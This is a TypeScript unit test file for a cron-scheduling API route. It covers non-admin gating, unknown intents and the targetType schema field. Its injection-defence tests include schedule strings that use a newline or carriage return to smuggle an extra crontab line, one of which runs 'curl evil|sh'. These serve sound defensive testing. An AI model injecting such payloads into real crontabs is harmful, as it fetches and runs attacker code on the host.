/**
 * test/api-cron.test.ts - Unit tests for app/routes/api.cron.tsx (TASK-460).
 *
 * Covers:
 *   - Gate: action returns { ok: false } on a non-admin instance (MC_USER=robin).
 *   - targetType field flows through the create schema (ask-3).
 *
 * Uses process.env mutation (restored in afterEach) to set the instance user.
 * No real crontab is ever touched - all cron.server calls are rejected before
 * they reach crontab operations via the instance gate or by failing target validation.
 *
 * ASCII only - no em-dashes (FND-05).
 */

import { describe, it, expect, afterEach } from "vitest";
import { action } from "~/routes/api.cron";

const ORIGINAL_MC_USER = process.env["MC_USER"];

afterEach(() => {
  // Restore the env after each test.
  if (ORIGINAL_MC_USER === undefined) {
    delete process.env["MC_USER"];
  } else {
    process.env["MC_USER"] = ORIGINAL_MC_USER;
  }
});

/** Build a fake Request with form-encoded body. */
function makeRequest(fields: Record<string, string>): Request {
  const body = new URLSearchParams(fields).toString();
  return new Request("http://localhost/api/cron", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body,
  });
}

describe("api.cron action - instance gate", () => {
  it("refuses create on a non-admin instance (MC_USER=quill)", async () => {
    process.env["MC_USER"] = "quill";

    const request = makeRequest({
      intent: "create",
      schedule: "30 7 * * *",
      target: "sprout",
      message: "morning check-in",
      enabled: "true",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain("not available on this instance");
    }
  });

  it("refuses setEnabled on a non-admin instance (MC_USER=quill)", async () => {
    process.env["MC_USER"] = "quill";

    const request = makeRequest({
      intent: "setEnabled",
      id: "abc123",
      enabled: "false",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
  });

  it("refuses delete on a non-admin instance (MC_USER=quill)", async () => {
    process.env["MC_USER"] = "quill";

    const request = makeRequest({
      intent: "delete",
      id: "abc123",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
  });

  it("allows action when MC_USER is unset (defaults to alex)", async () => {
    // Unset MC_USER so mcUser() returns "alex" (the default).
    delete process.env["MC_USER"];

    // This will reach cron.server functions but with a missing target -> reject gracefully.
    const request = makeRequest({
      intent: "create",
      schedule: "30 7 * * *",
      target: "nonexistent-agent-xyz",
      message: "test",
      enabled: "true",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    // Gate passes (alex's instance) but cron.server rejects the unknown target.
    // Both paths return { ok: false }, but for different reasons.
    // We just confirm it doesn't throw and returns ok: false.
    expect(typeof result.ok).toBe("boolean");
  });

  it("allows action when MC_USER=robin (robin is now a trusted principal)", async () => {
    process.env["MC_USER"] = "robin";

    // Gate passes for robin; cron.server rejects the unknown target gracefully.
    const request = makeRequest({
      intent: "create",
      schedule: "30 7 * * *",
      target: "nonexistent-agent-xyz",
      message: "test",
      enabled: "true",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    // Gate passes; action reaches cron.server and fails on unknown target -- NOT "not available".
    if (!result.ok) {
      expect(result.error).not.toContain("not available on this instance");
    }
  });

  it("rejects unknown intent", async () => {
    delete process.env["MC_USER"];

    const request = makeRequest({ intent: "bogus" });
    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain("Unknown intent");
    }
  });
});

// ---------------------------------------------------------------------------
// Schedule injection defence at the api/cron boundary (SECURITY)
// ---------------------------------------------------------------------------

describe("api.cron action - schedule injection defence", () => {
  it("rejects a newline-injection schedule at the api/cron create endpoint", async () => {
    delete process.env["MC_USER"];

    // Injection payload: embedded newline turns a valid cron line into two
    // lines when interpolated into the crontab. The api route must reject this
    // before it reaches createCron (schema-level) OR createCron itself must
    // reject it (seam-level). Either way, ok must be false.
    const injectedSchedule = "* * * * *\n* * * * * curl evil|sh # MC-CRON:x";
    const request = makeRequest({
      intent: "create",
      schedule: injectedSchedule,
      target: "sprout",
      message: "legit message",
      enabled: "true",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
  });

  it("rejects a carriage-return-injection schedule at the api/cron create endpoint", async () => {
    delete process.env["MC_USER"];

    const request = makeRequest({
      intent: "create",
      schedule: "30 7 * * *\r* * * * * evil",
      target: "sprout",
      message: "legit",
      enabled: "true",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// targetType field flows through create schema (ask-3)
// ---------------------------------------------------------------------------

describe("api.cron action - targetType field", () => {
  it("passes targetType=agent through create schema (gate passes, server rejects unknown target)", async () => {
    delete process.env["MC_USER"];

    const request = makeRequest({
      intent: "create",
      schedule: "30 7 * * *",
      target: "nonexistent-agent-xyz",
      message: "test",
      enabled: "true",
      targetType: "agent",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    // Gate passes; cron.server rejects unknown target. ok=false for the right reason.
    expect(result.ok).toBe(false);
    if (!result.ok) {
      // Should fail at target validation, not at schema parsing.
      expect(result.error).not.toContain("Invalid create payload");
    }
  });

  it("passes targetType=script through create schema", async () => {
    delete process.env["MC_USER"];

    const request = makeRequest({
      intent: "create",
      schedule: "*/30 * * * *",
      target: "nonexistent-agent-xyz",
      message: "#!/usr/bin/env bash\necho hi",
      enabled: "true",
      targetType: "script",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).not.toContain("Invalid create payload");
    }
  });

  it("defaults targetType to agent when not provided", async () => {
    delete process.env["MC_USER"];

    // Omit targetType; schema should default to "agent" and gate should pass.
    const request = makeRequest({
      intent: "create",
      schedule: "0 9 * * *",
      target: "nonexistent-agent-xyz",
      message: "morning",
      enabled: "true",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      // Schema parsed OK (default applied), then cron.server rejected unknown target.
      expect(result.error).not.toContain("Invalid create payload");
    }
  });

  it("rejects an invalid targetType value at schema level", async () => {
    delete process.env["MC_USER"];

    const request = makeRequest({
      intent: "create",
      schedule: "30 7 * * *",
      target: "sprout",
      message: "test",
      enabled: "true",
      targetType: "tmux",
    });

    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain("Invalid create payload");
    }
  });
});
